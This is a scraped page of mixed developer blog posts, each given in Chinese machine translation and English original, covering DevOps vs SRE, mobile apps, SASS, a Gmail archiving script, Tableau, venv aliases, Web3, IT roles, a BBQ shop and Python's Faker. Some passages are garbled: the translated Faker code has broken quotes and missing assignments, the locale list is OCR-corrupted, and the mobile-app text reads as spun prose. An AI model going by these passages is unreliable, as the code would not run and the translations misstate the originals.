    The software development life cycle has come a long way - from a non-overlapping development model - the Waterfall Model to an iterative development model like Agile and DevOps. It’s interesting to notice that before the beginning of the DevOps movement (~2007-2008), SRE was born at Google (2003), to build the reliability and resiliency of the entire Google Infrastructure. Google in its SRE book, described how the collaborative efforts of DevOps engineers, SRE, and other engineers like Application Security engineers are vital for maintaining a product like Gmail.

    Looking at the above example, it is safe to say that our growing dependency on applications, is what has propelled the widescale adoption of DevOps and SRE. Whether it’s to streamline our business functionalities or launch an app that simplifies our life, we need reliable and scalable systems at every step.

    What is DevOps?

    DevOps defines a software development approach with a shift in organizational culture towards agility, automation, and collaboration. It aims at eliminating siloes and bridging the gaps between the different departments of development and operations.
    In this process, the code development goes through iterative steps of - Continuous Development, Continuous Integration, Continuous Testing, Continuous Feedback, Continuous Monitoring, Continuous Deployment, and Continuous Operations. Also popularly known as ‘7Cs of DevOps Lifecycle.’

    What is SRE?

    Site Reliability Engineering or SRE plays a more comprehensive role in streamlining the end-user experience and is more concerned with incorporating software development practices into IT operations. To put it simply, the SRE concept says that if a developer handles the task of IT operations, what are the places where automation can be brought into the picture. This means it expects to use automation as a means to fix many of the problems arising while managing applications in production.

    SRE uses three service level agreements to measure the application performance -

    • Service level agreements (SLAs) - to define the appropriate reliability, performance, and latency of the application, as desired by the end-user.
    • Service level objectives (SLOs) - The target goals set by the SRE team to meet the expectations of SLAs.
    • Service level indicators (SLIs) - to measure specific metrics (like system latency, system throughput, lead time, mean time to restore (MTTR), development frequency, and availability error rate) to conform to the SLOs.

    Similarities between SRE and DevOps

    • Both methodologies are focused on monitoring production and ensuring the operations management works as smoothly as expected.
    • One of their fundamental principles is breaking siloes. It aims at bringing all the stakeholders (Dev team + Ops team) in the application development together. Believe in the model of ‘shared responsibility’ and ‘shared ownership.’
    • Their common goal is to simplify the operations in the distributed system.

    Differences and Interrelation between SRE and DevOps

    Development and Implementation

    DevOps focuses on building the core of the product. The core is why the product is developed in the first place. It works on the aspect of customer requirements - the different needs and specifications. Taking an agile approach to software development with the continuous process of build, test, and deployment.
    SRE teams narrow their focus around the fact of whether the core is really implemented. Whether the product is meeting the expectations of the customer. It monitors the metrics of the application performance and gives feedback to the DevOps team, about the direction of changes that need to be implemented.

    Nature of Skills

    The DevOps team is more experimental in nature. They write codes and test them constantly for bugs, or may be adding new features. They develop the core design of the product, give shape to it, and push it to production. The SRE team on the other hand is investigative in nature. They constantly monitor the concerned metrics and give feedback on the possible lines of improvement. They are concerned more with the experience of the end-user. They perform an analysis of every problem, to see its frequency, and find ways of automating the repetitive operations.

    Their goal is to find ways to innovate in recurring instances of bugs.

    Automation

    Be it DevOps or SRE the sole purpose of their existence can be distinguished by the fact, that they both aim at automating manual processes. It's not about just saving time in terms of doing tasks, but extends beyond the fact that anything done manually is prone to errors.
    When it comes to automation in DevOps, it means automating deployment (tasks and new features). However, automation in SRE is automating redundancy. They convert the manual tasks into programmatic tasks to keep the tech stacks up and running.

    Goal

    Every set of tasks ever assigned has a goal associated with it. The goal of DevOps is to develop a template to drive activities towards collaboration. And SRE team focuses on formulating prescriptive measures to enhance the reliability of every deployed application.

    Conclusion

    Both SRE and DevOps have a shared goal of breaking siloed workflow, bringing automation to recurring manual tasks, and incorporating constant monitoring. Some prime areas where they face challenges are:

    • CI/CD pipeline management: Implementing different automated tests at different stages of pipelines to ensure errorless codes.
    • Monitoring and Alerting: The core function is to help us in increasing the reliability of our applications. Gaining 360-degree visibility into the system will help in diagnosing the health of services and gaining vital analytics.
    • Incident Management: To understand the cause of service failures, the severity of a bug, or even to get alerted immediately when any requests start failing requires prompt communication.

    _Platforms enabling managed microservices and managed Kubernetes help us in maintaining the lifecycle of applications, by addressing the above-mentioned challenges. Looking at the data on managed services market size, a projection of $ 274 billion by 2026, shows their potential in simplifying the manageability of applications. _

    With the global tech giants like Google, Amazon, and Netflix pioneering the adoption of DevOps and SRE, their ROI has grown in leaps and bounds. Furthermore, looking at their never-down robust infrastructure, it is evident that these methodologies are here for the long run.
    Do give a look here! An insightful article on DevSecOps best practices.

    Kaustubh Trivedi - May 20

    Adheeban Manoharan - May 21
item.author: komaljprabhakar

item.title: 为什么移动应用程序开发对企业很重要？ | Why Mobile App Development is Important for Businesses?
item.description:
毫无疑问，有了技术的源泉，业务也在飞速发展。 现在，每个企业都需要一个移动应用程序来促进他们的业务增长，它已经成为它不可或缺的一部分。 移动应用程序行业正在增长，但尚未全面发展。 然而，关于瑞士市场的数据已经非常令人鼓舞：据 Statista 称，瑞士是继韩国之后的第二大移动应用客户。 因此，由于业务对移动应用程序的高需求，移动应用程序开发公司也大幅增加。 让我们讨论移动应用程序开发如何对企业有所帮助。

了解什么是移动应用程序开发

移动应用程序开发过程创建在智能手机上运行的移动应用程序。 这些应用程序可以预先安装在设备上、从移动商店下载或通过移动网络浏览器访问。 通常，移动应用程序使用 Web 连接来使用独立的计算辅助设备。 因此，应用程序增长过程包括：

  • 创建可安装的软件包
  • 使用后台服务，例如通过 API 输入数据
  • 目标设备的 应用测试

要开发灵活且健壮的移动应用程序，您需要考虑硬件需求、屏幕尺寸和其他影响应用程序开发过程的特性。

为什么需要商业应用程序？

无论是初创公司还是成熟的公司，移动应用程序已成为当今所有公司必不可少的。 作为企业主，您不能忽视它的好处。 让我们看看一些有利于企业的移动应用程序开发应用程序，

移动应用程序是现代技术的一个基本特征，它不断改变消费者的购物方式和满足他们的需求。 随着技术进步的快速增长，客户的期望也在不断扩大。 移动应用程序已成为满足用户期望的有效媒介。

例如，零售购物是满足大多数移动应用程序的基本企业分类之一。 通过切换到移动应用程序，您一定会让您的兴趣和服务更实惠、更易于使用。 当前的客户行为优先考虑个性化和简单性，而应用程序使客户可以轻松访问。

您对消费者的重视程度越高，他们对您的产品的吸引力就越大。 但是，如果没有有意识的品牌尝试，就不可能接受深入的开发细节。 这就是品牌移动应用程序进入概念的地方。

移动应用程序已成为日常生活的重要组成部分。 应用程序所有者可以使用此渠道来使他们的产品受益。 您在应用中获得的营销功能越多，您对产品营销结果的预期影响就越大。 您还可以从此应用程序收集数据以了解目标受众并改进您的产品营销策略。

提高收益产生和产品理解的最佳方法之一是专注于提高客户关注度。 如果您成功地提高了消费者与您的产品互动的频率，您将遇到投资回报率、客户交易和其他重要指标的增加。 想要提高向应用程序添加一些功能所需的关注度的应用程序所有者。

对他们来说，最重要的可能是识别类别。 它包括生成多用户分类和管理提供给每个用户功能的内容类型。 用户隔离允许您提供准确的建议、发送个人笔记并令人满意地了解您的客户。

在瞬息万变的数字氛围中与对手保持一致是非常困难的。 移动应用程序为您提供了对挑战者的重大限制。 与常规网站和数字论坛相比，移动应用程序在提供更快的传输和改善客户沟通方面做得更好。 考虑到移动应用程序设计可以改善您的业务运营的程序数量，对您创收的整体影响最终将变得清晰。

另一个可以满足移动业务应用增长的业务衡量标准是营销部门。 当企业选择移动应用程序时，数字零售商所欣赏的第一个也是最大的好处是直接访问用户详细信息。

从应用程序内的用户会话中收集的数据对于增强您的营销行动和行动非常有价值。 一旦您的广告商可以访问他们需要的所有数据，该应用程序就允许他们向与其他标准交易渠道近似的用户提供更高效和个性化的内容。

如何生成移动应用程序

如果您想制作一个应用程序或使用新应用程序限制您现有的业务，那么在升级之前您应该考虑以下一些工作。 这些步骤对于您的应用程序的成功至关重要。

选择你的目标

在开始应用程序开发过程时，您应该清楚自己的目标。 您的计划最终将决定您的应用程序的整体实施。 如果你没有从一开始就明确定义你的目标，那么在你构建你的应用程序之后很容易失去目标。 总是设定一些可衡量的目标。 否则，您将无法有效地利用您的时间和帮助。 您可以设置与完成用户和您的公司相关的目标。 每个目的都应该有明确的 KPI 来估计和跟踪其成功。

研究目标需求

在为您的企业开发移动应用程序时，您需要研究并了解更多有关您目标市场的信息。 它将支持了解消费者如何与产品互动、指导参与者、市场力量等。 此外，检查市场上顶级应用程序的用户评论。 它将帮助您提出更有利可图的发展，并了解您的目标受众。 了解用户的位置、平均年龄以及他们使用的设备类型。

确定您的应用程序组件

必须包含在您的应用程序中的相关功能，您需要确定以最佳方法支持您的用户所需的组件。 虽然向您的应用程序添加流行功能听起来很有吸引力，但不必要的功能可能会让您的用户感到沮丧。 此外，您添加的功能越多，它的价格就越贵，您升级手机的时间也就越长。 因此，最好在发展的早期阶段专注于恢复。



原文:

No doubt, with the source of technology, business is also growing at a rapid speed. Now, every business needs a mobile app for the growth of their business, and it has become an integral part of it. The mobile apps industry is growing and has not yet seen full development. However, the data regarding the Swiss market are already very encouraging: according to Statista, Switzerland is the second-largest customer of mobile applications after South Korea. Thus, mobile app development companies also increase tremendously due to the high demand for mobile apps for the business. Let's discuss how mobile app development is helpful for a business.

Understand What is Mobile App Development

The mobile application development process creates mobile apps that operate on smartphones. These applications can be pre-installed on the device, downloaded from the mobile store, or accessed through a mobile web browser. Generally, a mobile application uses a web connection to work with isolated computing aids. Thus, the application growth process includes:

  • Creating installable software packages
  • Using background services such as data entry via the API
  • Application testing on targeted appliances

To develop mobile applications that are flexible and robust, you need to consider hardware necessities, screen sizes, and other characteristics that influence the application development procedure.

Why Do You Need an App For Business?

Whether it has startups or established corporations, mobile applications have become essential for all companies nowadays. You cannot afford to ignore its benefits as a business owner. Let's have a look at some mobile app development apps that benefit businesses, 

1. Furnish Valuable Customers

Mobile applications are an essential feature of modern technology that constantly changes the way consumers shop and fulfill their requirements. With the rapid growth of technological advances, customer expectations are also extending. Mobile applications have become an effective medium for satisfying users' expectations.

For example, retail shopping is one of the fundamental enterprise classifications that satisfy most mobile apps. You are sure to make your interests and services more affordable and easier to use by switching to mobile apps. Current customer behavior prioritizes personalization and simplicity, and apps make that easily accessible to the customer.

2. Construct a More Powerful Brand

The more importance you give your consumers, the more attraction they have to your product. However, it is impossible to accept in-depth development details without conscious branding attempts. This is where branded mobile apps get into the concept.

Mobile applications have become an essential part of day-to-day lives. App owners can use this channel to benefit their products. The more marketing features you get within your app, the better the impact you can expect from product marketing results. You can also collect data from this app to understand the target audience and improve your product marketing strategy.

3. Perform Advanced Consumer Attention Level

One of the best ways to improve earnings generation and product understanding is to focus on improving the level of customer attention. If you successfully increase the frequency with which the consumers interact with your product, you will encounter an addition in ROI, customer deal, and other significant metrics. App owners who want to improve the level of attention they required to add some features to the app.

Possibly the most important thing to them is to identify the categories. It includes producing multi-user classifications and managing the type of content provided to each user feature. User segregation permits you to deliver accurate suggestions, send personal notes, and understand your customer satisfactorily.

4. Have a Competitive Advantage in your Place

It is pretty tough to maintain with your opponents in an ever-changing digital atmosphere. The mobile app gives you a significant limitation over your challengers. Compared to regular websites and digital forums, mobile apps do a much better job when it comes to delivering faster transmission and improved customer communication. Considering the number of procedures in which a mobile app design can improve your business operations, the overall influence on your revenue generation will ultimately become clear.

5. Construct a Personalized Marketing Chanel

Another measurement of ​​business that can satisfy the growth of a mobile business application is the marketing department. The first and best benefit that digital retailers appreciate when corporations select mobile applications is direct access to user details.

Data collected from user sessions within the app can be valuable in enhancing your marketing actions and movements. Once your advertisers have access to all the data they require, the app allows them to deliver more efficient and personalized content to users approximated to other standard transaction channels.

How to Generate a Mobile Application

If you want to make an app or limit your existing business with a new app, here are some efforts you should consider before upgrading. These steps are essential to the success of your application.

Select your Objectives

You should be clear about your goals when starting the app development process. Your plans will eventually decide the overall implementation of your application. It is easy to lose the objectives after you build your app if you have not clearly defined your goals from the beginning. Always set some measurable objectives. Otherwise, you will not be able to use your time and aids effectively. You can set goals related to completing users and your corporation. Every purpose should have clear KPIs to estimate and follow its success.

Research the Target Demands

You need to research and find out more about the market you are targeting when developing mobile applications for your business. It will support understanding how consumers interact with products, guiding players, market power, and more. Also, inspect user reviews for top apps in the market. It will help you to come up with a more profitable development and also understand your target audience. Understand the location of your users, the average age, and the types of appliances they operate.

Determine your App Components

The relevant features that must include in your application, you need to determine the components required to support your users in the best possible method. While adding popular features to your app may sound attractive, unnecessary features can leave your users frustrated. In addition, the more features you add, the more expensive it will be and the longer you upgrade your mobile phone. Therefore, it is good to focus on recovery in the early stages of development.

item.author: christophercialone

item.title: SASS 中 Mixin 和 Placeholder 的区别 | Difference between Mixin and Placeholder in SASS
item.description:
在 SASS 中，Mixin 和 Placeholder 非常相似。 它们可以包含 css 属性的组合，并且可以在许多地方重用，就像变量一样有助于减少我们的代码。 但是，它们实际上在幕后的工作方式不同。

  • 占位符- 它将使用占位符的选择器复制到声明占位符的位置。

让我们看看下面的例子：
我们声明了一个 mixin bananaColor和一个占位符coffeeBackground 。

它们被以下类使用：
结果是这样的：

让我们比较一下 SASS 是如何编译代码的。

对于 Mixin，它将声明的 mixin 属性复制到使用它的地方。

对于占位符，它将选择器（ .paragraph2, .paragraph3 ）复制到声明它的占位符。

总之，我们可以看到 Mixin 和 Placeholder 确实是在做相反的事情。

但是，它可能会导致更大的 CSS 代码，因为它只是将声明的 Mixin 复制到任何地方，而 Placeholder 只复制选择器。

除此之外，Mixin 可以像函数一样工作。 我们也可以将参数传递给 Mixin，但我们不能在 Placeholder 上使用参数。

我们可以根据实际情况选择使用 Mixin 或 Placeholder。



原文:

In SASS, Mixin and Placeholder are really similar. They can hold combination of css properties and can be reused in many places, just like variables to help reduce our codes. However, they actually work differently behind the scene.

  • Mixin - It copies the mixin to the place where it is used.

  • Placeholder - It copies the selectors that use the placeholder to the place where the placeholder declared.

Let's see the following example:
We declared a mixin bananaColor, and a placeholder coffeeBackground.

They are used by the following classes:
.paragraph1 uses bananaColor.
.paragraph2 uses bananaColor and coffeeBackground.
.paragraph3 uses coffeeBackground.

SASS file:

@mixin bananaColor { color: #f5c725; font-weight: 600;
} %coffeeBackground { background-color: #b46427; padding: 10px;
} .paragraph1 { font-size: 20px; height: 100px; @include bananaColor;
} .paragraph2 { font-size: 20px; height: 100px; @include bananaColor; @extend %coffeeBackground
} .paragraph3 { font-size: 20px; height: 100px; @extend %coffeeBackground
}

Html File:

<!DOCTYPE html>
<html> <head> <link rel="stylesheet" href="css/style.css"> </head> <body> <div> <p class="paragraph1">paragraph 1</p> <p class="paragraph2">paragraph 2</p> <p class="paragraph3">paragraph 3</p> </div> </body>
</html>

The result is like:

Let's compare how SASS compiles the code.

For Mixin, it copies the declared mixin properties to places where it is used.

For placeholders, it copies the selectors(.paragraph2, .paragraph3) to the placeholder where it is declared.

In conclusion, we can see Mixin and Placeholder are literally doing things reversely.

The logic of Mixin could be more intuitive and understandable than Placeholer. However, it may result in larger CSS code because it just copies the declared Mixin to everywhere, while Placeholder only copies the selectors.

Apart from that, Mixin can work like a function. We can also pass parameters into a Mixin, while we cannot use parameters on Placeholder.

Mixin and Placeholder can really help us organize and reduce our SASS code. We can choose to use either Mixin or Placeholder depending on our actual scenarios.

item.title: 自动归档 Dependabot 和语义发布电子邮件 | Automatically archiving Dependabot and Semantic Release emails
item.description:
作为一名开源维护者，我每天会收到数百封来自 Dependabot 和 Semantic Release 的电子邮件。 不久前，我整理了以下Google Apps 脚本片段，以根据一些简单的正则表达式模式自动归档电子邮件，以完成以下任务：

  • 归档合并或关闭的 Dependabot 电子邮件
  • 存档语义发布发布有关拉取请求和问题的通知。

目前，这是每 5 分钟在 cron 中运行一次。

 function main () { // archive dependabot notifications GmailApp . moveThreadsToArchive ( GmailApp . search ( ' label:"inbox" from:dependabot[bot] ' ). filter (( thread ) => threadMatches ( thread , [ /Merged .* into .*/ , /Closed / ]) ) ); // archive semantic release publish notifications GmailApp . moveThreadsToArchive ( GmailApp . search ( ' label:"inbox" from:github-actions[bot] ' ). filter (( thread ) => threadMatches ( thread , [ /This PR is included in version/ , /This issue has been resolved in version/ , ]) ) ); } function threadMatches ( thread , patterns ) { const messages = thread . getMessages (); if ( messages . length > 1 ) { for ( let message of messages ) { for ( let pattern of patterns ) { const match = message . getBody (). match ( pattern ); if ( match ) { return true ; } } } } return false ; }

这都是非常基本的，但它可以完成工作。 未来的工作可能集中在反转dependabot 功能，以便根据线程的日期和拉取请求的当前状态，如果需要操作，线程将被移动到收件箱。

我还没有为跨越不同存储库、组织等的开源工作找到完美的工作流程。电子邮件是完整覆盖的一个很好的支持，上面的脚本给了我一些最终的一致性。



原文:

As an Open Source maintainer, I get hundreds of emails a day from Dependabot and Semantic Release. A while back, I put together the below Google Apps Script snippet to automatically archive the emails based upon some simple regex patterns to accomplish the following tasks:

  • Archive Dependabot emails that are merged or closed
  • Archive Semantic Release publish notifications on pull requests and issues.

Currently this is running in a cron every 5 minutes.

function main() { // archive dependabot notifications GmailApp.moveThreadsToArchive( GmailApp.search('label:"inbox" from:dependabot[bot]').filter((thread) => threadMatches(thread, [/Merged .* into .*/, /Closed /]) ) ); // archive semantic release publish notifications GmailApp.moveThreadsToArchive( GmailApp.search('label:"inbox" from:github-actions[bot]').filter((thread) => threadMatches(thread, [ /This PR is included in version/, /This issue has been resolved in version/, ]) ) );
} function threadMatches(thread, patterns) { const messages = thread.getMessages(); if (messages.length > 1) { for (let message of messages) { for (let pattern of patterns) { const match = message.getBody().match(pattern); if (match) { return true; } } } } return false;
}

This is all pretty basic, but it does the job. Future work might focus on inverting the dependabot functionality so that depending on the date of the thread and current status of the pull request, the thread will be moved to the inbox if action is required.

I have yet to find the perfect workflow for my open source work spanning different repositories, organizations, etc. Email is a good backstop for complete coverage and the scripts above give me some eventual consistency.
item.author: jpoehnelt

item.title: Tableau BI 可以帮助您扩大公司规模 | What Tableau BI can help you increase the size of your company
item.description:
它通过使用一种新的数据可视化方法来帮助企业跟上不断变化的技术并超越其竞争对手。 接受过Tableau 培训的 Tableau 开发人员已成为炙手可热的对象。

通过其简单的拖放功能，可以在几分钟内创建信息，而不是几个月，甚至几年。

加速推向市场 加快推向市场 Tableau 以直接且合乎逻辑的方式分析和处理数据。 这可以节省开发时间并提高决策效率。 能够适应市场趋势是一项重要的竞争优势。

用户友好性和易用性 Tableau 数据可视化软件简化了数据分析。

它消除了不必要的压力，而是专注于最重要的事情，即决定数据的价值。 大数据分析能力

通过其用于分析的内存引擎，Tableau 可让您连接到最新数据。

这意味着分析将同时非常快速。



原文:

Tableau lets businesses make decisions based on the tools for data visualization that are available to users from any background and in any industry. It helps businesses keep up with ever-changing technology and surpass its competitors by using a new method for visualizing data. Tableau developer who have Tableau Training have become highly sought-after.

Tableau can be connected to any data source including Data Warehouse, MS Excel or any other web data. Tableau provides immediate insight through changing data and turning it into appealing interactive dashboards. Through its easy drag-and-drop function it is possible to create information in minutes, not several months, or perhaps years.

Accelerate to Market Speed to Market Tableau analyzes and processes data in a straightforward and logical manner. This saves development time and improves the process of making decisions efficient. Being able adapt to market trends is a significant competitive advantage.

Tableau aids in making quick and informed decision-making based on data which gives increase in efficiency
User-Friendliness and Ease of Use Tableau Data visualization software eases the analysis of data .

It eliminates unnecessary stress, and instead focuses on what is most important and that's determining the worth of your data. Drag and drop interface in Tableau is easy to learn and eliminates the need for IT professionals.

Tableau capabilities -

Big data analytics capabilities

Tableau allows direct connections using high-performance database systems as well as cloud-based data sources, and Hadoop. Tableau lets you use your data to create reports or dashboards as well as other stories. Through its in-memory engine for analysis, Tableau lets you connect to data that is current.

Tableau lets users perform their own analysis using the drag and drop point and click function that lets users make reports, charts and dashboards, as in stories.

Tableau's in-memory engine to store data is not limited to storing data that is stored in your computer's RAM. Tableau's in-memory technology makes use of all memory within your computer up into your drive. This means that analysis will be very fast while at the same time.
item.author: divl93391250

item.title: 只是匆匆忙忙。 | Just a quickie.
item.description:
以下是我用于 python 虚拟环境的别名。

 # aliases for venv (python-venv) alias create-venv = 'python3 -m venv /home/${USER}/.config/venv/${PWD##*/}' alias remove-venv = 'rm -rf /home/${USER}/.config/venv/${PWD##*/}' alias activate-venv = 'source /home/${USER}/.config/venv/${PWD##*/}/bin/activate'

这些别名在 /home/username/.config/venv/directoryname 中创建一个 virtualenv

仅获取您当前所在的目录名称，而不是完整路径。

IE the full path '/home/username/code/python/app_name' ${PWD##*/} returns only app_name IE 完整路径 '/home/username/code/python/app_name' ${PWD##*/} 只返回 app_name



原文:

Here are the aliases that I use for python virtual environments.

# aliases for venv (python-venv)
alias create-venv='python3 -m venv /home/${USER}/.config/venv/${PWD##*/}'
alias remove-venv='rm -rf /home/${USER}/.config/venv/${PWD##*/}'
alias activate-venv='source /home/${USER}/.config/venv/${PWD##*/}/bin/activate'

These aliases create a virtualenv in /home/username/.config/venv/directoryname

Gets only the directory name your currently in, not the full path.

I.E. the full path '/home/username/code/python/app_name' ${PWD##*/} returns only app_name
item.author: mikecase

item.title: Web3 Solidity + JavaScript 32 小时课程回顾 #1 | Web3 Solidity + JavaScript 32 hour course recap #1
item.description:
它长达 32 小时。

今晚我完成了前 8 分 42 秒。 这主要是炒作和流行语。

围绕这个我有很多目标，但我会尝试每天花一小时浏览视频，直到完成整个课程。

我还将记录自己完成课程的过程，并且我将尝试快速写一些关于我每天所学的内容，如果有足够的问题，有时可能会写一篇适当的博客文章。

我对此的总体目标非常明确：我对我的日常工作不满意。 我希望能够为我的至少一个辅助项目的后端获得 Web3 开发人员资助。 但是，我也愿意转变为某种 Web3 角色。

我的总体反应是，我很惊讶区块链开发人员的平均年收入仅为 14.5 万美元，因为我在 Twitter 上听到了 20 万美元以上的消息，而且区块链开发人员的薪水和中级程序员之间真的没有区别。

话虽如此，开发人员学习 Web3 的风险几乎为 0，因为这些技能直接转化为 Web2，并且对于软件开发，如果我们想跟上行业的步伐，我们总是必须学习新的东西。



原文:

D0 00:00 - 08:42
Patrick Collin's course for learning Solidity for Web3 in JavaScript was published today on FreeCodeCamp. It is 32 hours long.

I made it through the first 8 minutes and 42 seconds tonight. It was mostly just hype and throwing around buzzwords.

I have many goals surrounding this, but I'm going to try and spend one hour every day working through the video until I am done with the entire course.

I am also going to record myself working my way through the course, and I am going to try to write something quick about what I've learned every day, and maybe sometimes write a proper blog post if something is giving me enough issues.

My overarching goals for this is very transparent: I am unhappy at my day job. I would love to be able to get Web3 developer grants for the backend of at least one of my side projects. However, I am also open to transitioning into some sort of Web3 role.

My overall reaction is that I am surprised that a blockchain developer is only making, on average, $145k a year because I was hearing $200k+ on Twitter, and there's really no difference between a blockchain developer's salary and a mid-level programmer.

That being said, there's virtually 0 risk for developers to learn Web3 since the skills translate directly into Web2, and with software development we always have to be learning something new if we want to keep up with the industry.
item.author: detwiler_amy

item.description: 原文:
item.author: nickytonline

item.title: 调整 IT 中的角色 | Resizing of Roles in IT
item.description:
在计算机技术领域，我们看到开发人员和其他计算机专业人员每天如何努力实现他们的路线图。 这种漫长的职业生涯意味着一系列的知识、资源，以及对某个特定角色所需的一系列技能和能力的管理。

然而，每天都会观察到所谓的“角色过度调整”，即在特定领域中覆盖比正常情况更多的元素的趋势。

前端开发人员就是这种情况，他们打算将他们提升到后端或全栈开发人员或网页设计师的水平，他们的角色严格来说是设计，并且不需要对网页有任何了解。

令人担忧的是，在初级开发人员的情况下，他们试图强加与高级开发人员相对应的技术，但作为刚开始编程的开发人员，报酬仍在继续。

尽管这种情况适合许多寻求更多要求和更少支付的公司，但这是一种威胁质量和服务的情况，必须与角色和责任的明确分离相对应，并且需要在 IT 开发中划定各个领域。



原文:

In the world of computer technology we see how developers and other computer professionals strive every day to achieve their roadmap. This long career implies a series of knowledge, resources, as well as the management of a series of skills and abilities required for a certain and specific role.

However, every day what is known as “Role Oversizing” is also observed, that is, a tendency to cover more elements in a specific field than should normally occur.

Such is the case of Frontend Developers who intend to take them to the level of Backend or Fullstack Developers or web designers whose role is strictly that of design and who do not have to know anything about web pages.

It is worrying when in the case of Junior Developers they try to impose technologies that correspond to Senior Developers but the pay continues as developers who are just starting out in programming.

Although this situation suits many companies that seek to demand more and pay less, it is a situation that threatens quality and service, which must correspond to a clear separation of roles and responsibilities and is necessary to delimit each area in IT development.
item.author: ozziescode

item.title: 烧烤店的小历史 - 我们的故事 | A little history of The BBQ Store - Our Story
item.description:
我们是一家私有的澳大利亚公司，在新南威尔士州普雷斯顿 2170 年的 Unit 6 / 12 Lyn Parade 设有仓库直接陈列室。

烧烤店提供范围广泛的领先品牌和价格具有竞争力的木炭和燃气烧烤、比萨烤箱、户外厨房、吸烟者、庭院加热器、烧烤配件等。 我们专注于木炭烤肉机，并拥有适用于任何烤肉机系统的最大范围的吐痰电机和配件。 我们确保 100% 的满意保证，并且所有物品都附带完整的制造商零件和人工保修。 我们通过澳大利亚邮政或快递服务将货物送到您的家中或办公室，并在需要时提供后挡板升降服务。

我们对如何使用我们的产品的精彩故事印象深刻，听到人们站在烧烤分享故事时与朋友和家人一起创造的新的甚至是旧的回忆，我们深受鼓舞。 我们希望你能和我们一起旅行，把它变成你的故事。

多年来，The BBQ Store 已发展成为一家专门从全球进口传统产品的公司，寻找正宗和传统的 Rotisserie 烧烤以及各种 Rotisserie 备件和配件。

我们也是令人兴奋的新产品“The BarbeSkew”的澳大利亚独家经销商。 它以传统塞浦路斯烧烤的原理为基础，具有一些令人兴奋的新功能，例如烤烟机和边桌。

自从 BeefEater、Everdure、Hark & Bradley 产品加入我们的产品系列以来，我们已经能够为我们的客户提供更广泛的产品，包括烟熏炉、比萨烤箱、燃气烧烤炉、户外厨房、加热产品等等。 我们很高兴能够为您提供如此广泛的创新、优质、物有所值的产品选择。

为了加强我们的燃气烧烤系列，我们很自豪现在能够为您提供全系列的 BeefEater 和 Everdure 烧烤以及加热和冷却产品。 我们现在还提供一系列 Everdure 加热器和空调，您可以在 The BBQ Store 找到所需的一切。

The success of The BBQ Store is built on our solid reputation for providing innovative products, excellent communication, exceptional service, and our 100% satisfaction guarantee policy. The BBQ Store 的成功建立在我们提供创新产品、出色沟通、卓越服务和 100% 满意保证政策的良好声誉之上。



原文:

The BBQ Store is Australia's largest online BBQ and Rotisserie specialists. We are a privately owned Australian company, with a warehouse direct showroom located at Unit 6 / 12 Lyn Parade, Prestons, NSW 2170.

The BBQ Store offers an extensive range of leading brands and competitively priced Charcoal & Gas BBQ's, pizza ovens, outdoor kitchens, smokers, patio heaters, BBQ accessories and more. We specialise in Charcoal Rotisseries and have the largest range of spit motors and accessories for any rotisserie system. We ensure 100% guaranteed satisfaction, and all items come with a full manufacturer's parts and labour warranty. We deliver through Australia Post or a Courier service to your home or office, with a tailgate lift service available where required.

The BBQ Store Pty Ltd is a privately owned Australian company that was established in 2010 to make the traditional Cyprus Grill family BBQ into an Australian custom. We have been so impressed with the great stories of how our products are being used and we are inspired by hearing about new or even old memories people are making with their friends and family's while standing around the BBQ sharing stories. We hope that you will journey with us and make this your story.

Over the years The BBQ Store has grown into a company specialised in importing traditional products from all over the globe looking for that authentic and traditional Rotisserie Barbecues as well as a wide range of Rotisserie spare parts and accessories.

We are also the Exclusive Australian Distributors for an exciting new product know as "The BarbeSkew". The BarbeSkew is sold all over Europe by it's UK Inventor Ed Wray. It is built on the principle of the Traditional Cypriot Grill with some exciting new features like a Roasting Hood & Side Table.

Since the addition of BeefEater, Everdure, Hark & Bradley products to our range, we have been able to offer our customers a wider range of products covering Smokers, Pizza Oven's, Gas BBQ's, Outdoor Kitchens, Heating products and much more. We are thrilled to be able to offer you this wide selection of innovative, quality, value for money products.

To strengthen our Gas BBQ range, we are proud to now be able to offer you the full range of BeefEater and Everdure BBQ's together with heating and cooling products. BeefEaters reputation as a market leading offering Australian Desgined BBQ's is second to none. We also now have a range of Everdure Heaters & Air Conditioners available, so that you can find all that you need right here at The BBQ Store.

The success of The BBQ Store is built on our solid reputation for providing innovative products, excellent communication, exceptional service, and our 100% satisfaction guarantee policy.

item.title: Python中的假数据生成器 | Fake data generator in Python
item.description:
以下示例是 Faker 生成假姓名、出生日期、地址、国家/地区、电子邮件的简单演示。

 from faker import Faker #Faker instance fake = Faker () print ( 'Name:' , fake . name ()) print ( 'Date of Birth:' , fake . date_of_birth ()) print ( 'Address:' , fake . address ()) print ( 'Country:' , fake . country ()) print ( 'Email:' , fake . email ())

输出

Name:Stephen Palmer Date of Birth:1984-02-24 Address:880 Jones Wells Suite 398 West Kimberlyfort,WI 86842 Country:Romania Email:taylorelaine@gmail.com

输出

 First Name:Jamie Last Name:Stephenson Name:Julie Davidson

要更改语言，我们需要将特定的语言环境传递给 Faker 类。

 from faker import Faker #Faker instance in #English-India language fake Faker ( 'en_In' ) print ( 'First Name:' , fake . first_name ()) print ( 'Last Name :, fake.last_name()) print(' Name : ',fake.name()) print(' -------------- ') #Faker instance in #Hindi-India language fake1 Faker(' hi_In ') print(' First Name :, fake1 . first_name ()) print ( 'Last Name:' , fake1 . last_name ()) print ( 'Name:' , fake1 . name ())

输出

 First Name:Dhruv Last Name:Tripathi Name:Sara Dave -------------- First Name:राजीव Last Name:दूबे Name:अमर आहूजा

输出

['ar_AA','ar_EG','ar_JO','ar_PS','ar_SA','bg_BG','bs_BA','cs_CZ','de', de_AT','de_CH','de_DE','dk_DK','el CY','el_GR','en','en_AU','en_CA', 'en_GB','en_IE','en_IN','en NZ','en_PH','en_TH','en_US','es','es_CA', 'es_ES','es MX','et EE','fa IR','fi_FI','fil PH','fr_CA','fr_CH','fr_F R','fr_QC','he_IL','hi_IN','hr_HR','hu_HU','hy_AM','id_ID','it_CH','₁ t_IT','ja_JP','ka_GE','ko_KR','la','1b_LU','lt_LT','1v_LV','mt_MT', e_NP','n1_BE','nl_NL','no_NO','or_IN","pl_PL','pt_BR','pt_PT','ro_RO', 'ru_RU','sk_SK','sl_SI','sv_SE','ca_IN','th','th_TH','el_PH','tr_TR¹, 'tw_GH','uk_UA','zh_CN','zh_TW']

输出

 ['__class_','_delattr_', '_dir_','__doc____', '_dict_', 'address','am_pm',... 'android platform_token','ascii_company_email', 'word','words','year','zip', 'zipcode','zipcode_in_state','zipcode_plus4']



原文:

Faker is a Python package that allows you to generate your own fake dataset.By using this package you can generate random data such as Name,Address,Email,City,Country etc. This package supports multiple locations and languages to generate data based on locality.

